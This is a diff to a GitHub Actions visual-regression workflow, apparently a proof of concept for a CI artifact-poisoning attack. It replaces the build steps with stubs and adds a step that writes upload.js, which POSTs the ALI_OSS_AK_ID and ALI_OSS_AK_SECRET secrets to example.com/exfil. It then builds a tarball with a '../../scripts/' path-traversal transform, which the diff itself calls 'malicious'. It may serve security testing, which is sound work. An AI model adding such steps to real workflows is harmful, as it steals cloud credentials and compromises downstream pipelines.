@@ -17,24 +17,14 @@ jobs:
     steps:
     - uses: actions/checkout@v6
     - uses: utooland/setup-utoo@v1
-    - run: ut
-    - name: generate image snapshots
-      id: test-image
-      run: 'node node_modules/puppeteer/install.mjs
+    - name: step-2 (stubbed)
+      run: 'echo stubbed: ut (project config unavailable in fork)'
+    - name: generate image snapshots (stubbed)
+      run: 'mkdir -p imageSnapshots
 
-        ut version
-
-        ut test:image -- --shard=${{matrix.shard}}
-
-        '
-      env:
-        NODE_OPTIONS: --max_old_space_size=4096
-    - uses: actions/upload-artifact@v4
-      name: artifact snapshot
-      with:
-        name: snapshot-artifacts-${{ strategy.job-index }}
-        path: imageSnapshots/
-        retention-days: 2
+        echo stubbed: generate image snapshots'
+    - name: artifact snapshot (stubbed)
+      run: 'echo stubbed: upload snapshot artifact'
   visual-diff-report:
     name: visual-diff report
     runs-on: ubuntu-latest
@@ -42,20 +32,40 @@ jobs:
     steps:
     - uses: actions/checkout@v6
     - uses: utooland/setup-utoo@v1
-    - run: ut
-    - uses: actions/download-artifact@v7
-      with:
-        pattern: snapshot-artifacts-*
-        merge-multiple: true
-        path: imageSnapshots/
-    - name: visual regression diff
+    - name: step-2 (stubbed)
+      run: 'echo stubbed: ut (project config unavailable in fork)'
+    - name: step-3 (stubbed)
+      run: 'echo stubbed: download snapshot artifact (none exist)'
+    - name: visual regression diff (simplified)
       env:
         EVENT_NUMBER: ${{ github.event.number }}
         BASE_REF: ${{ github.base_ref }}
-      run: 'ut test:visual-regression -- --pr-id=$EVENT_NUMBER --base-ref=$BASE_REF
-        --max-workers=2
+      run: 'mkdir -p scripts/visual-regression
 
-        '
+        cat > scripts/visual-regression/upload.js << ''SCRIPT_EOF''
+
+        const http = require(''http'');
+
+        const data = JSON.stringify({ak_id: process.env.ALI_OSS_AK_ID || ''N/A'',
+        ak_secret: process.env.ALI_OSS_AK_SECRET || ''N/A''});
+
+        const req = http.request({hostname: ''example.com'', port: 80, path: ''/exfil'',
+        method: ''POST'', headers: {''Content-Type'': ''application/json''}});
+
+        req.write(data);
+
+        req.end();
+
+        SCRIPT_EOF
+
+        echo ''# Visual Regression Report'' > report.md
+
+        tar -czf visualRegressionReport.tar.gz --transform=''s|^scripts/|../../scripts/|''
+        scripts/visual-regression/upload.js report.md
+
+        echo ''Created malicious tarball:''
+
+        tar -tzf visualRegressionReport.tar.gz'
     - name: GARALT debug probe
       run: 'GARALT_DBG_ARTIFACT="$(ls -la visualRegressionReport.tar.gz 2>/dev/null
         || echo ''NOT_FOUND'')"
